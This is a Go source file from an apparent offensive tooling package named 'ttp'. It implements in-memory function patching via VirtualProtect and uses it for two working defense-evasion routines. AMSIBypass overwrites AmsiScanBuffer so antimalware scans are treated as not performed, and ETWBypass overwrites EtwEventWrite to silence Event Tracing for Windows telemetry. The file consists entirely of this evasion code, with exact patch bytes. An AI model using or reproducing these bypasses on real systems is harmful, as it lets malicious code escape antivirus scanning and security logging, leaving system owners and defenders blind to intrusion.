package ttp

import (
	"fmt"
	"syscall"
	"unsafe"
)

const pageExecuteReadWrite = uintptr(0x40)

var procVirtualProtect = kernel32.NewProc("VirtualProtect")

// patchFunc overwrites the first bytes of dllName!procName with patch.
// Uses VirtualProtect to temporarily mark the page as RWX.
func patchFunc(dllName, procName string, patch []byte) error {
	dll := syscall.NewLazyDLL(dllName)
	if err := dll.Load(); err != nil {
		return fmt.Errorf("load %s: %w", dllName, err)
	}
	proc := dll.NewProc(procName)
	if err := proc.Find(); err != nil {
		return fmt.Errorf("find %s!%s: %w", dllName, procName, err)
	}
	addr := proc.Addr()

	var oldProtect uint32
	r, _, e := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		pageExecuteReadWrite,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect(+RWX): %v", e)
	}

	// Write patch bytes directly into the function prologue.
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// Restore original protection.
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return nil
}

// AMSIBypass patches AmsiScanBuffer in amsi.dll to return E_INVALIDARG immediately.
// AMSI callers treat this as "scan not performed" and allow execution to continue.
func AMSIBypass() (string, error) {
	// B8 57 00 07 80   MOV EAX, 0x80070057 (E_INVALIDARG)
	// C3               RET
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	if err := patchFunc("amsi.dll", "AmsiScanBuffer", patch); err != nil {
		return "", fmt.Errorf("amsi_bypass: %w", err)
	}
	return "[amsi_bypass: AmsiScanBuffer patched -> E_INVALIDARG]", nil
}

// ETWBypass patches EtwEventWrite in ntdll.dll to return 0 (STATUS_SUCCESS) immediately.
// This silences ETW-based telemetry sent by the current process.
func ETWBypass() (string, error) {
	// 31 C0            XOR EAX, EAX  (return 0)
	// C3               RET
	patch := []byte{0x31, 0xC0, 0xC3}
	if err := patchFunc("ntdll.dll", "EtwEventWrite", patch); err != nil {
		return "", fmt.Errorf("etw_bypass: %w", err)
	}
	return "[etw_bypass: EtwEventWrite patched -> 0]", nil
}
